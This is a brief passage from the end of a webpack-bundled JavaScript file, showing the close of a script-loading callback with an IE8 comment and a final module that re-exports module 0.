    this.onreadystatechange = null
    cb(null, script) // there is no way to catch loading errors in IE8
  }
}


/***/ }),
/* 6 */
/***/ (function(module, exports, __webpack_require__) {

module.exports = __webpack_require__(0);


/***/ })
/******/ ]);
});